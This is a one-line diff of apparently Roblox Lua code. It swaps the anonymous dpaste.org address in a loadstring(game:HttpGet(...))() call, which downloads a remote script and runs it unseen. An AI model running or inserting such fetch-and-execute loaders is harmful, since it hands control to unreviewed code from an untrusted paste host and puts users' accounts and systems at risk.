@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://dpaste.org/waVdN/raw"))()
+loadstring(game:HttpGet("https://dpaste.org/FrOnF/raw"))()
